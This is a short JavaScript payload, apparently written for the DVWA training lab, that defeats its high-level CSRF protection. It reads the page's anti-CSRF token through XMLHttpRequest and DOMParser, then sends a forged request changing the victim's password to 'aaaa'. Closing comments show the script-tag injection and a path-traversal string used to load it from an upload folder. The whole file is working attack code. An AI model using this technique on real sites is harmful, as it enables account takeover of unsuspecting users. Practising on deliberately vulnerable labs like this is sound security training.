var xhr;
var dvwa_csrf_url = "/dvwa/vulnerabilities/csrf/";
req1();

function req1() {
    xhr = new XMLHttpRequest();

    xhr.onreadystatechange = req2;
    xhr.open("GET", dvwa_csrf_url);
    xhr.send();
}

function req2() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var htmltext = xhr.responseText;
        var parser = new DOMParser();
        var htmldoc = parser.parseFromString(htmltext, "text/html");

        var CSRFtoken = htmldoc.getElementsByName("user_token")[0].value;
        alert("Found the token: " + CSRFtoken);

        xhr = new XMLHttpRequest();
        xhr.open(
            "GET",
            dvwa_csrf_url +
                "?password_new=aaaa&password_conf=aaaa&Change=Change&user_token=" +
                CSRFtoken
        );
        xhr.send();
    }
}
//<script src=/dvwa/hackable/uploads/csrf_high_payload.js></script>
//../../hackable/uploads/csrf_high_payload.js
